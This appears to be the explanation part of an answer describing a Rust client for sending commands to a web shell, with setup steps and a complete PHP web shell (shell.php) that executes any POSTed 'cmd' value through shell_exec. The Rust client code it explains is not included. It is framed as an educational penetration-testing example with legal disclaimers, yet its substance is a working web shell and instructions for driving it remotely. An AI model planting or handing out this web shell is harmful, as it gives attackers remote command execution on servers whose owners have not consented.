Explanation:
HTTP Requests: This script uses the reqwest crate to send HTTP POST requests to a server. It simulates the behavior of a web shell by sending commands (user input) to a server and receiving the response.

Command Handling: The script allows users to input commands which will then be sent to a web server running a vulnerable script (e.g., shell.php). The server is expected to execute the commands and return the results.

Rust Async: The script is asynchronous, using tokio to handle asynchronous HTTP requests.

Simulated Interaction: After entering a command, the script sends it to the server, and the server's response is printed as if it's the output from a shell.

Steps to Run:
Set Up Dependencies: Make sure you have Rust installed. You'll need to add dependencies in your Cargo.toml file.

[dependencies]
reqwest = { version = "0.11", features = ["json"] }
tokio = { version = "1", features = ["full"] }
Server Setup: On the server side, you would need a script (like shell.php) capable of receiving a cmd parameter, executing the command, and returning the result. Do not deploy this on any server without authorization.

Run the Script: Once everything is set up, you can run the script using cargo run after making sure the Rust environment is set up correctly.

Example of a shell.php (for the server-side):

<?php
    if (isset($_POST['cmd'])) {
        $cmd = escapeshellcmd($_POST['cmd']);
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
    }
?>
Legal Considerations:
Penetration Testing: This script is an educational example. To use such a tool ethically, you must have explicit permission from the server owner or administrator to test the security of their system.

Legal Risks: Unauthorized use of such tools could result in criminal charges and severe consequences. Always ensure you're testing systems that you have explicit permission to interact with.
